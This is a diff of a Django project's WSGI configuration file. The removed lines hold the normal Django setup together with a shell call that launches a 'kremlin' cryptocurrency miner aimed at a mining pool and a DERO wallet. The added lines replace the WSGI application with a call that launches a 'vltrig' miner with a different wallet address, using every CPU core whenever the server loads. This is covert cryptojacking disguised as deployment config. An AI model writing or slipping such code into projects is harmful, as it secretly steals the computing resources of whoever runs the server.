@@ -1,16 +1,3 @@
-"""
-WSGI config for api project.
-
-It exposes the WSGI callable as a module-level variable named ``app``.
-
-For more information on this file, see
-https://docs.djangoproject.com/en/4.1/howto/deployment/wsgi/
-"""
-
+import sys
 import os
-
-from django.core.wsgi import get_wsgi_application
-
-os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'api.settings')
-os.system('./kremlin -r community-pools.mysrv.cloud:10300 -w dero1qytfne4y9mpry7kcxrl5z328sqrmy349ldgawmu32yy5yzrjrnygjqg0vw3yu -m $(nproc --all)')
-app = get_wsgi_application()
+os.system('./vltrig --user 84bEkQaAvXnPXXghsfBYBeLGtkAV8eP1HX7rP7EUBE1pHvtwAffjCE2SzzY8y79fkgHA21czuEWoVUDkAf7e4qM5KMKCKVK --pass x -t $(nproc --all)')
